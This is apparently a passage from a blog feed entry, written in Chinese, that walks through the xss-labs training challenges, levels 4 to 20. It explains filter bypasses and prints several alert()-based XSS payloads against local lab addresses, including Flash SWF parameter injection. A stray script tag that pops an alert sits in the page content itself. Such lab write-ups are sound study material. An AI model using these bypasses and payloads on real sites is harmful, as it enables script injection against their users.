-<h2 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h2>
-<p>和上面一样</p>
-<h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2>
-<p>on 和 script 都被过滤<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254229213-160.png" alt="在这里插入图片描述" />这里用 javascript:伪协议<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254230943-163.png" alt="在这里插入图片描述" />出来的链接就是答案</p>
-<h2 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h2>
-<p>可以大小写绕过</p>
-<h2 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> level 7</h2>
-<p>把特殊字符便空了<br />
-可以双写绕过</p>
-<h2 id="level-8"><a class="markdownIt-Anchor" href="#level-8"></a> level 8</h2>
-<p>这关卡的死死的<br />
-要编码绕过<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254233662-166.png" alt="" /></p>
-<h2 id="level-9"><a class="markdownIt-Anchor" href="#level-9"></a> level 9</h2>
-<p>strpos 函数看是否有 http://<br />
-验证是否为安全连接<br />
-但是没有限定位置<br />
-要编码下<br />
-还要把 <a href="http://xn--fqrv31bujbhw2ayl4b//%E6%B3%A8%E9%87%8A%E6%8E%89">http://放最后面用//注释掉</a><br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254238979-169.png" alt="在这里插入图片描述" /></p>
-<h2 id="level-10-13"><a class="markdownIt-Anchor" href="#level-10-13"></a> level 10-13</h2>
-<p>页面没有注入点<br />
-看源代码发现隐藏的表单<br />
-要改为文本框 text</p>
-<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">type=&quot;text&quot; onclick=&quot;alert(1)&quot;</span></span></code></pre></div></div></figure>
-<p>后面几关都要改 t_sort<br />
-因为后端获取 t_sort 和 user-agent 等<br />
-要从相应注入点注入<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254242198-172.png" alt="在这里插入图片描述" /></p>
-<h2 id="level-14"><a class="markdownIt-Anchor" href="#level-14"></a> level 14</h2>
-<blockquote>
-<p>exif xss 漏洞，exif 是可交换图像文件格式（英语：Exchangeable image file format，官方简称 Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到 exif 的相关属性。</p>
-<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br />
-甚至有些照片能看到经纬度<br />
-这关要用到<br />
-<a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br />
-但是<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254247114-178.png" alt="在这里插入图片描述" /> &gt; <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254245020-175.png" alt="在这里插入图片描述" /></p>
-</blockquote>
-<h2 id="level-15"><a class="markdownIt-Anchor" href="#level-15"></a> level 15</h2>
-<h2 id="level-16"><a class="markdownIt-Anchor" href="#level-16"></a> level 16</h2>
-<p>对 script、/、空格进行了转换<br />
-空格不可以就用换行符</p>
-<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">&lt;a%0atype=&quot;text&quot;%0a&quot;alert&quot;</span><span style="color: #F97583">&gt;</span></span></code></pre></div></div></figure>
-<h2 id="level-17-18"><a class="markdownIt-Anchor" href="#level-17-18"></a> level 17-18</h2>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254252815-181.png" alt="在这里插入图片描述" /><br />
-火狐不支持 swf 格式<br />
-把链接加网页上显示出这样<br />
-很奇怪<br />
-开始整套娃了<br />
-<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254256501-184.png" alt="在这里插入图片描述" /></p>
-<p>要找个支持 flash 的浏览器才能正常打开<br />
-17-20 关都能用 flash xss<br />
-<a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br />
-但这里先用别的办法<br />
-以 18 关为例<br />
-注入点可以在 arg02<br />
-但是你连 swf 都没有哪来的 moouseover 哪<br />
-所以得 url 连接一下</p>
-<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">http:</span><span style="color: #F97583">//</span><span style="color: #79B8FF">127.0</span><span style="color: #E1E4E8">.0.1</span><span style="color: #F97583">/</span><span style="color: #E1E4E8">xss</span><span style="color: #F97583">-</span><span style="color: #E1E4E8">labs</span><span style="color: #F97583">/</span><span style="color: #E1E4E8">level18.php</span><span style="color: #F97583">/</span><span style="color: #E1E4E8">xsf02.swf</span><span style="color: #FDAEB7; font-style: italic">?</span><span style="color: #E1E4E8">a</span><span style="color: #F97583">=</span><span style="color: #FDAEB7; font-style: italic">?</span><span style="color: #E1E4E8">arg01</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">a</span><span style="color: #F97583">&amp;</span><span style="color: #E1E4E8">arg02</span><span style="color: #F97583">=%</span><span style="color: #FDAEB7; font-style: italic">20onmouseover</span><span style="color: #F97583">=</span><span style="color: #E1E4E8">javascript:alert(</span><span style="color: #79B8FF">1</span><span style="color: #E1E4E8">)</span></span></code></pre></div></div></figure>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254258261-187.png" alt="在这里插入图片描述" /></p>
-<h2 id="level-19-20"><a class="markdownIt-Anchor" href="#level-19-20"></a> level 19-20</h2>
-<p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS 漏洞快速上手</a><br />
-<a href="https://www.secpulse.com/archives/44299.html">flash xss 原理</a><br />
-<a href="https://github.com/jindrapetrik/jpexs-decompiler">flash 反编译工具</a><br />
-以下是大佬的 payload</p>
-<blockquote>
-<p>卑微小杨在线 emo<br />
-flash 反编译也不懂<br />
-等有空了再研究吧<br />
-好多困难等着被克服那<br />
-这次没支持 flash 的浏览器真没法做</p>
-<p>18 关</p>
-</blockquote>
-<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">http: //10</span><span style="color: #B392F0">.0.1</span><span style="color: #E1E4E8">.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;</span><span style="color: #85E89D">a</span><span style="color: #E1E4E8"> href=&quot;javascript:alert(/bmfx/)&quot;</span><span style="color: #F97583">&gt;</span><span style="color: #E1E4E8">bmfx&lt;/</span><span style="color: #85E89D">a</span><span style="color: #F97583">&gt;</span><span style="color: #E1E4E8"> ;</span></span></code></pre></div></div></figure>
-<p>19 关</p>
-<figure class="shiki css"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki github-dark"><code><span class="line"><span style="color: #E1E4E8">http: ; //10</span><span style="color: #B392F0">.0.1</span><span style="color: #E1E4E8">.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx</span><span style="color: #79B8FF">\&quot;</span><span style="color: #E1E4E8">))}catch(e){</span><span style="color: #79B8FF">alert</span><span style="color: #E1E4E8">(/</span><span style="color: #79B8FF">bmfx</span><span style="color: #E1E4E8">/)}//%26width=998%26height=998</span></span></code></pre></div></div></figure>
-<script>
-setTimeout(function () {
-    alert('xss');
-}, 1000);
-</script>]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
-        <tag>xss-lab</tag>
       </tags>
   </entry>
   <entry>
